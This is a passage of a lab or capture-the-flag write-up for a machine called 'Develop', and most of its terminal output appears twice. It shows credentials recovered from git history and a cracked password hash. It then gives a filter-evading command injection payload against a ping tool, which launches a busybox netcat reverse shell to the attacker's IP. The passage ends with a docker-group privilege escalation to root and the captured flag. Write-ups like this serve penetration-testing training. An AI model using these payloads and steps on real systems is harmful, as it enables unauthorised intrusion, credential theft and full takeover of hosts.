Checking the second commit shows the credentials inside the staff table:

┌──(kali㉿kali)-[~/Desktop/Labs/Develop/Files]
└─$ git show df8f5fe4cd94745215a77656912221cc12f6cf89                
commit df8f5fe4cd94745215a77656912221cc12f6cf89
Author: franz <franz@develop.site>
Date:   Mon Dec 7 17:06:09 2020 +0000

    testing login

diff --git a/init.sql b/init.sql
new file mode 100644
index 0000000..e27be17
--- /dev/null
+++ b/init.sql
@@ -0,0 +1,16 @@
+DROP SCHEMA IF EXISTS app;
+CREATE SCHEMA app;
+USE app;
+
+CREATE TABLE staff(
+    id INT NOT NULL AUTO_INCREMENT,
+    username VARCHAR(20),
+    email VARCHAR(40),
+    password VARCHAR(255),
+    PRIMARY KEY(id)
+);
+
+# Inserting staff
+INSERT INTO staff(username, email, password) VALUES("franz", "franz@develop.info", "2df3f8123cd4cf019e215a37a19d0972");
+INSERT INTO staff(username, email, password) VALUES("alex", "alex@develop.info", "2af05664fdd33119293ce07da4509139");
+INSERT INTO staff(username, email, password) VALUES("lu191", "lu191@develop.info", "0e987654321098765432109876543210");
┌──(kali㉿kali)-[~/Desktop/Labs/Develop/Files]
└─$ git show df8f5fe4cd94745215a77656912221cc12f6cf89                
commit df8f5fe4cd94745215a77656912221cc12f6cf89
Author: franz <franz@develop.site>
Date:   Mon Dec 7 17:06:09 2020 +0000

    testing login

diff --git a/init.sql b/init.sql
new file mode 100644
index 0000000..e27be17
--- /dev/null
+++ b/init.sql
@@ -0,0 +1,16 @@
+DROP SCHEMA IF EXISTS app;
+CREATE SCHEMA app;
+USE app;
+
+CREATE TABLE staff(
+    id INT NOT NULL AUTO_INCREMENT,
+    username VARCHAR(20),
+    email VARCHAR(40),
+    password VARCHAR(255),
+    PRIMARY KEY(id)
+);
+
+# Inserting staff
+INSERT INTO staff(username, email, password) VALUES("franz", "franz@develop.info", "2df3f8123cd4cf019e215a37a19d0972");
+INSERT INTO staff(username, email, password) VALUES("alex", "alex@develop.info", "2af05664fdd33119293ce07da4509139");
+INSERT INTO staff(username, email, password) VALUES("lu191", "lu191@develop.info", "0e987654321098765432109876543210");

Passing the MD5 hash to hashes.com cracks the password of user alex:

The retrieved password is BrainStorming_777.

Checking the other commits shows the to-do list:

┌──(kali㉿kali)-[~/Desktop/Labs/Develop/Files]

From the output above, it looks like blacklist and whitelist filters have been applied to one of their web application. Also, what is this cut they speak of?

Browsing to the web application on port 8080 returns the following webpage:

Login using the credentials of user alex to gain access:

There is a ping tool which could be vulnerable to command injection:

Maybe the blacklist and whitelist filters have been applied to this tool.

It seems like the web application is vulnerable to command injection:

The payload I used is the following:

ping=-1%0ap'i'ng%09-c%091%09192.168.45.239
ping=-1%0ap'i'ng%09-c%091%09192.168.45.239

The payload above converts to the following:

ping=-1
p'i'ng	-c	1	192.168.45.239
ping=-1
p'i'ng	-c	1	192.168.45.239

Start up a listener on port 80. Then perform command injection to retrieve a shell:

In the example above, I used the following payload:

ping=-1%0abusybox%09n\c%09192.168.45.239%0980%09-e%09bash
ping=-1%0abusybox%09n\c%09192.168.45.239%0980%09-e%09bash

This payload transforms to the following:

ping=-1
busybox	n\c	192.168.45.239	80	-e	bash
ping=-1
busybox	n\c	192.168.45.239	80	-e	bash

Since the filters are in place, I used busybox to avoid the special symbols such as / and ; which are blocked automatically.

Now I have a shell on the machine as the user www-data:

┌──(kali㉿kali)-[~/Desktop/Labs/Develop/Files]
└─$ nc -lvnp 80 
listening on [any] 80 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.159.135] 59046
whoami
www-data


┌──(kali㉿kali)-[~/Desktop/Labs/Develop/Files]
└─$ nc -lvnp 80 
listening on [any] 80 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.159.135] 59046
whoami
www-data

The database.php contains the following credentials:

www-data@develop:/var/www/html/admin$ cat database.php
cat database.php
<?php
$config = [
    'db_engine' => 'mysql',
    'db_host' => '127.0.0.1',
    'db_port' => '33060',
    'db_name' => 'app',
    'db_user' => 'root',
    'db_password' => 'Th1s_1s_4_Strong_DB_Password!',
];

$db_config = $config['db_engine'] . ":host=".$config['db_host'].":".$config['db_port']. ";dbname=" . $config['db_name'];

try {
    $pdo = new PDO($db_config, $config['db_user'], $config['db_password'], [
        PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"
    ]);
        
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
} catch (PDOException $e) {
    exit("Impossibile connettersi al database: " . $e->getMessage());
}
?>
www-data@develop:/var/www/html/admin$ cat database.php
cat database.php
<?php
$config = [
    'db_engine' => 'mysql',
    'db_host' => '127.0.0.1',
    'db_port' => '33060',
    'db_name' => 'app',
    'db_user' => 'root',
    'db_password' => 'Th1s_1s_4_Strong_DB_Password!',
];

$db_config = $config['db_engine'] . ":host=".$config['db_host'].":".$config['db_port']. ";dbname=" . $config['db_name'];

try {
    $pdo = new PDO($db_config, $config['db_user'], $config['db_password'], [
        PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"
    ]);
        
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
} catch (PDOException $e) {
    exit("Impossibile connettersi al database: " . $e->getMessage());
}
?>

Gain access to the machine using the SSH key as the user franz:

┌──(kali㉿kali)-[~/Desktop/Labs/Develop]
└─$ chmod 600 id_rsa
                                                                                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/Labs/Develop]
└─$ ssh franz@develop.site -i id_rsa 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

$ id
uid=1000(franz) gid=1000(franz) groups=1000(franz),998(docker)
$ whoami
franz
$

As shown in the output above, this user belongs to the docker group.

Use this script to obtain a root shell. The privilege escalation involves in using the mysql image to obtain a root shell:

franz@develop:/tmp$ vim exp.sh
franz@develop:/tmp$ chmod +x exp.sh 
franz@develop:/tmp$ ./exp.sh 
[*] Getting Container Image...
[+] Extracted Image: mysql:8.0.22
[*] Trying to get Shell...
# whoami
root
# cat /root/proof.txt
a80c1b96086439abbc0a417256380b3a
# 

franz@develop:/tmp$ vim exp.sh
franz@develop:/tmp$ chmod +x exp.sh 
franz@develop:/tmp$ ./exp.sh 
[*] Getting Container Image...
[+] Extracted Image: mysql:8.0.22
[*] Trying to get Shell...
# whoami
root
# cat /root/proof.txt
a80c1b96086439abbc0a417256380b3a
#
